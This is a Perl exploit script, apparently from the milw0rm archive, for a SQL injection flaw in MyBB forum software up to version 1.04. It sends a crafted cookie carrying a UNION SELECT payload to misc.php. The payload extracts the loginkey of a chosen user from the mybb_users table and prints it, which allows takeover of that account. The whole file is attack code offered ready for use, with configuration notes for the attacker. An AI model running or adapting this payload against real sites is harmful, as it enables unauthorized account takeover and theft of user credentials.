#!/usr/bin/perl -w

# MyBB <= 1.04 (misc.php COMMA) Remote SQL Injection Exploit 2 , Perl C0d3
#
# Milw0rm ID :-
#			http://www.milw0rm.com/auth.php?id=1539
# D3vil-0x1 | Devil-00 < BlackHat > :)
#
# DONT FORGET TO DO YOUR CONFIG !!
# DONT FORGET TO DO YOUR CONFIG !!
# DONT FORGET TO DO YOUR CONFIG !!
use IO::Socket;

##-- Start --#

$host 	= "127.0.0.1";
$path		= "/mybb3/";
$userid	= 1;
$mycookie 	= "mybbuser=1_xommhw5h9kZZGSFUppacVfacykK1gnd84PLehjlhTGC1ZiQkXr;";

##-- _END_ --##
#	$host		:-
#				The Host Name Without http:// | exm. www.vic.com
#
#	$path		:-
#				MyBB Dir On Server | exm. /mybb/
#
#	$userid	:-
#				The ID Of The User U Wanna To Get His Loginkey
#
#	$cookie	:-
#				You Must Register Username And Get YourCookies ( mybb_user ) Then But it Like This
#	
#				$cookie 	= "mybbuser=[YourID]_[YourLoginkey];";
$sock = IO::Socket::INET->new (
										PeerAddr => "$host",
										PeerPort	=> "80",
										Proto		=> "tcp"
										) or die("[!] Connect To Server Was Filed");
##-- DONT TRY TO EDIT ME --##										
$evilcookie = "comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=$userid/*;";
##-- DONT TRY TO EDIT ME --##						
$evildata  = "GET ".$path."misc.php?action=buddypopup HTTP/1.1\n";
$evildata .= "Host: $host \n";
$evildata .= "Accept: */* \n";
$evildata .= "Keep-Alive: 300\n";
$evildata .= "Connection: keep-alive \n";
$evildata .= "Cookie: ".$mycookie." ".$evilcookie."\n\n";

print $sock $evildata;

while($ans = <$sock>){
	$ans =~ m/<a href=\"member.php\?action=profile&amp;uid=1\" target=\"_blank\">(.*?)<\/a><\/span><\/td>/ && print "[+] Loginkey is :- ".$1."\n";
}

# milw0rm.com [2006-03-03]
